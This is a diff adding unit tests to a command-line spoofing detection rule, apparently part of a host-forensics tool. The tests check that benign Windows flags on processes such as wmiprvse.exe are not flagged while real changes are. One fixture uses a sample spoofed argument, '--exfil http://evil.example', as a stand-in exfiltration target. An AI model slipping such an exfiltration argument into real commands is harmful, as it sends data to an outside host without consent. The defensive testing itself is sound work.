@@ -320,6 +320,59 @@ def test_quoted_arguments_containing_spaces_are_one_token():
     assert rule_cmdline_spoofing(_cmdlines('x.exe -p "a b"', 'x.exe -p "a  b"')) != []
 
 
+# #696: benign flags were stripped one per loop iteration, so two of them
+# together never compared equal. These go through the rule, not the helper.
+
+def test_two_benign_flags_together_are_not_spoofing():
+    """The host shape: WMI's provider host. 4 of 18 host reports carried a
+    critical finding for exactly this pair."""
+    assert rule_cmdline_spoofing(
+        _cmdlines("C:\\Windows\\System32\\wbem\\wmiprvse.exe -secured -Embedding",
+                  "C:\\Windows\\System32\\wbem\\wmiprvse.exe")) == []
+    assert rule_cmdline_spoofing(
+        _cmdlines("C:\\Windows\\System32\\wbem\\wmiprvse.exe",
+                  "C:\\Windows\\System32\\wbem\\wmiprvse.exe -secured -Embedding")) == []
+
+
+def test_three_benign_flags_including_valued_ones_are_not_spoofing():
+    """Flags that carry a value (`/prefetch:N`, `-servername:X`) match as a
+    token prefix, alongside a bare one."""
+    assert rule_cmdline_spoofing(
+        _cmdlines("C:\\app.exe -a", "C:\\app.exe -a /prefetch:5 -servername:Foo -Embedding")) == []
+
+
+def test_a_real_spoof_that_also_carries_benign_flags_is_still_critical():
+    """Stripping the flags must not strip the argument that changed."""
+    findings = rule_cmdline_spoofing(
+        _cmdlines("C:\\app.exe -secured -Embedding",
+                  "C:\\app.exe -secured -Embedding --exfil http://evil.example"))
+    assert len(findings) == 1
+    assert findings[0]["severity"] == "critical"
+
+
+def test_a_quoted_space_change_beside_benign_flags_is_still_critical():
+    """The helper's gate: a removed flag must not turn it into a comparator that
+    ignores the space inside a quoted argument."""
+    assert rule_cmdline_spoofing(
+        _cmdlines('x.exe -p "a b" -secured -Embedding', 'x.exe -p "a  b"')) != []
+
+
+def test_the_helper_says_benign_only_when_a_flag_was_removed():
+    """The docstring's gate, at the helper because the rule cannot show it: the
+    rule calls the helper only after the normalised lines differ, and token
+    lists that are equal with nothing removed normalise equal, so through the
+    rule the gate is unobservable. A direct caller must still get False when no
+    benign flag was present."""
+    assert cr._is_benign_cmdline_difference("x.exe -a", "x.exe -a") is False
+    assert cr._is_benign_cmdline_difference("x.exe -a", "x.exe -a -Embedding") is True
+
+
+def test_a_benign_flag_is_a_whole_token_not_a_substring():
+    """A token merely containing a flag's text is an argument, not the flag:
+    `-x-secured` is not `-secured`."""
+    assert rule_cmdline_spoofing(_cmdlines("C:\\app.exe", "C:\\app.exe -x-secured")) != []
+
+
 # --- evaluate_rules + empty-report safety ---
 
 def test_evaluate_rules_empty_report_is_safe():
